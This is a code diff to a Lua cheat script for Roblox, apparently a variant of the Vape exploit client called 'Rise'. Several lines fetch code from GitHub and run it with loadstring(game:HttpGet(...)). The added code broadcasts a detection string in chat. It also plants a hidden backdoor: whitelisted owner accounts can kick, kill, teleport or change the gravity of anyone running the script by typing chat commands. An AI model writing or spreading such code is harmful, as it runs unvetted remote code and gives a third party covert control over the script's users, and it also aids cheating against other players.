@@ -1228,11 +1228,80 @@ end)
 if players.XylexIsCanada then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
 	VapeGui["CreateNotification"]("Rise Detected", "XylexIsCanada is in ur game", 5)
-    lplr:Kick("Rise", "You has Kicked By Rise Owner, Good Luck Next Match")
 end
 
 if players.table0x54 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
 	VapeGui["CreateNotification"]("Rise Detected", "table0x54 is in ur game", 5)
-    lplr:Kick("Rise", "You has Kicked By Rise Owner, Good Luck Next Match")
+end
+
+local dumbwhitelist = {}
+pcall(function()
+    dumbwhitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/RiseForRoblox/main/whitelist.lua"))()
+end)
+
+local WhitelistsFunc = {
+    IsPrivUserInGame = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(dumbwhitelist) do
+                if v.UserId == tonumber(b) then
+                    return true
+                end
+            end
+        end
+        return false
+    end,
+    GetPrivUser = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(dumbwhitelist) do
+                if v.UserId == tonumber(b) then
+                    return v.Name
+                end
+            end
+        end
+    end
+}
+
+local alreadytold = {}
+local chatmsg = function(msg)
+	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
+end
+chatmsg("RISEUSERDETECTEDCODE")
+for i, v in pairs(game.Players:GetPlayers()) do
+    if lplr.Name == WhitelistsFunc.GetPrivUser() then 
+        v.Chatted:connect(function(msg)
+            if msg == "RISEUSERDETECTEDCODE" then
+                VapeGui["CreateNotification"]("Rise", v.Name .. " is using Rise!", 10)
+            end
+        end)
+    else
+        for lol, xd in pairs(dumbwhitelist) do
+            if v.UserId == tonumber(xd) then
+                v.Chatted:connect(function(msg)
+                    if msg:find(";kick") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub(";kick " .. lplr.Name, "")
+                            lplr:kick(args)
+                        end
+                    end
+                    if msg:find(";kill") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                        end
+                    end
+                    if msg:find(";lagback") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000, 0)
+                        end
+                    end
+                    if msg:find(";gravity") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub(";gravity " .. lplr.Name, "")
+                            game.Workspace.Gravity = tonumber(args)
+                        end
+                    end
+                end)
+            end
+        end
+    end
 end
